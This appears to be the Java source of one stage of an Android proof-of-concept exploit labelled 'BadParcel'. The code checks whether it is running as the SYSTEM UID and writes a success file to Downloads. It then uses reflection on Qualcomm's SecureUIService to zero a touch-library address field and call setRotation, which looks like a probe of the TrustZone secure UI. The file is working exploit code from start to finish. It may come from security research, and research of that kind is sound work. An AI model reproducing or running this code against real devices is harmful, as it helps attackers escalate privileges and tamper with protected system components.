package com.example.tzpoc;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.os.Process;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;

public class ProofActivity extends Activity {
    private static final String TAG = "ProofActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int myUid = Process.myUid();
        int callerUid = getCallingUid(); // 起動元のUID

        String msg = "[+] ProofActivity started. My UID=" + myUid + ", Caller UID=" + callerUid;
        Log.i(TAG, msg);
        MainActivity.appendLog(msg);

        if (myUid == 1000) {
            MainActivity.appendLog("[!!!] SUCCESS: Process running with SYSTEM UID (1000) !!!");
            createProofFile("system");
            attemptSecureUIReflection();
        } else if (callerUid == 1000) {
            // 起動元がシステムだが、自分はシステムでない場合（通常起こらない）
            MainActivity.appendLog("[!] Called by system but not running as system (myUid=" + myUid + ")");
            createProofFile("caller_system");
        } else {
            MainActivity.appendLog("[!] UID=" + myUid + " (not system). Exploit may have failed.");
        }

        finish();
    }

    private void createProofFile(String type) {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists()) dir.mkdirs();
            File proof = new File(dir, "uid_proof_" + type + ".txt");
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                pw.println("Process UID: " + Process.myUid());
                pw.println("Caller UID: " + getCallingUid());
                pw.println("Timestamp: " + new java.util.Date());
                pw.println("BadParcel exploit " + (type.equals("system") ? "succeeded!" : "partial"));
            }
            MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to create proof file: " + e.getMessage());
        }
    }

    private void attemptSecureUIReflection() {
        MainActivity.appendLog("[*] Attempting SecureUI reflection from system context...");
        try {
            Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
            java.lang.reflect.Field contextField = clazz.getDeclaredField("context");
            contextField.setAccessible(true);
            Object context = contextField.get(null);
            MainActivity.appendLog("[+] SecureUIService.context = " + context);

            java.lang.reflect.Field touchField = clazz.getDeclaredField("TOUCH_LIB_ADDR");
            touchField.setAccessible(true);
            byte[] orig = (byte[]) touchField.get(null);
            MainActivity.appendLog("[+] Original TOUCH_LIB_ADDR: " + bytesToHex(orig));

            byte[] newAddr = {0x00,0x00,0x00,0x00,0x00,0x00};
            touchField.set(null, newAddr);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR modified to zeros");

            java.lang.reflect.Method setRotation = clazz.getMethod("setRotation", int.class);
            setRotation.invoke(null, 16);
            MainActivity.appendLog("[+] setRotation(16) called.");

            touchField.set(null, orig);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR restored.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] SecureUI reflection failed: " + e.getMessage());
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02X ", b));
        return sb.toString();
    }
}
